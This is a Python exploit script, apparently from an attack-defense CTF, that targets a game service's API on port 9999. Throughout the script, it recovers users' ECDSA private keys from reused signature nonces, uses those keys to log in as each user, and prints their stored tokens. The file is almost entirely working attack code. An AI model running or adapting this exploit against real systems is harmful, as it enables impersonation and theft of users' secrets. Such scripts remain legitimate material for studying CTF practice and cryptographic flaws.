import re
import sys
import time
import json
import base64
import random
import string

from requests import Session
from ecdsa import VerifyingKey, SigningKey, NIST256p
from ecdsa.util import sigencode_string, sigdecode_string, number_to_string
from ecdsa.numbertheory import inverse_mod
from hashlib import sha256

ip = sys.argv[1]
port = 9999

url = f'http://{ip}:{port}'

s = Session()

username = ''
keys = {}
token = ''

def list_games():
    games = s.get(f'{url}/api/games/list').json()['games']
    return games

def get_pub_key(username):
    answer = s.get(f'{url}/api/user/pubkey', params={'username': username}).json()['pubkey']
    return answer

def get_auth_token(username, privkey):
    data = {'username': username, 'privkey': privkey}
    answer = s.post(f'{url}/api/user/token', json=data)
    return answer

def get_tokens(authtoken):
    headers = {"Authorization": authtoken}
    answer = s.get(f'{url}/api/tokens/getall', headers=headers)
    return answer


def get_struct_hash(struct, type='create_game'): # order is important in structures
    if type == 'create_game':
        creator = struct['creator']
        creator_first = "true" if struct['creator_first'] else "false" 
        grid_size = struct['grid_size']
        nonce = struct['nonce']
        data = '{"creator":"'+ creator +'","creator_first":' + creator_first + ',"grid_size":' + str(grid_size) + ',"nonce":' + str(nonce) + '}'
    elif type == 'make_move':
        X = struct['move']['X']
        Y = struct['move']['Y']
        move = '{"X":' + str(X) +',"Y":' + str(Y) + '}'
        player = str(struct['player'])
        nonce = str(struct['nonce'])
        data = '{"game_id":null,"move":'+move+',"player":'+player+',"nonce":'+nonce+'}'
    
    hash_ = sha256(base64.b64encode(data.encode())).hexdigest()
    return hash_

def unpack_signature(sig):
    sig_d = base64.b64decode(sig.encode())
    size = int(len(sig_d) / 2)
    r = sig_d[:size]
    s = sig_d[size:]
    r = int.from_bytes(r, 'big')
    s = int.from_bytes(s, 'big')
    return r, s


# NONCE REUSE ATTACK

def attack(publicKeyOrderInteger, signaturePair1, signaturePair2, messageHash1, messageHash2): 
    r1 = signaturePair1[0]
    s1 = signaturePair1[1]
    r2 = signaturePair2[0]
    s2 = signaturePair2[1]

    #Convert Hex into Int
    L1 = int(messageHash1, 16)
    L2 = int(messageHash2, 16)

    if (r1 != r2):
        print("ERROR: The signature pairs given are not susceptible to this attack")
        return None

    numerator = (((s2 * L1) % publicKeyOrderInteger) - ((s1 * L2) % publicKeyOrderInteger))
    denominator = inverse_mod(r1 * ((s1 - s2) % publicKeyOrderInteger), publicKeyOrderInteger)

    privateKey = numerator * denominator % publicKeyOrderInteger

    return privateKey


# --------------

games = list_games()
games = filter(lambda x: x['game_data']['creator_first'], games)

user_data = {}
for game in games:
    user = game['game_data']['creator']
    sigs = game['signatures']
    pubkey = base64.b64decode(get_pub_key(user))
    user_data[user] = {'signatures': sigs, 'messages': [get_struct_hash(game['game_data']), get_struct_hash(game['move_data'], type='make_move')], 'pubkey': pubkey}

cracked = {}
for user in user_data:
    sig1, sig2 = user_data[user]['signatures']
    m1, m2 = user_data[user]['messages']

    sig1 = unpack_signature(sig1)
    sig2 = unpack_signature(sig2)

    pubkey = user_data[user]['pubkey']

    vk = VerifyingKey.from_der(pubkey)

    privKeyExp = attack(vk.pubkey.order, sig1, sig2, m1, m2)
    
    sk = SigningKey.from_secret_exponent(privKeyExp, NIST256p)
    sig = sk.sign(bytes.fromhex(m1))
    try:
        vk.verify(sig, bytes.fromhex(m1))
        cracked[user] = base64.b64encode(sk.to_der()).decode()
    except:
        continue

for user in cracked:
    privkey = cracked[user]
    authtoken = get_auth_token(user, privkey).json()['token']

    try:
        tokens = [token['Token'] for token in get_tokens(authtoken).json()['tokens']]
        for token in tokens:
            print(token)
    except Exception as e:
        continue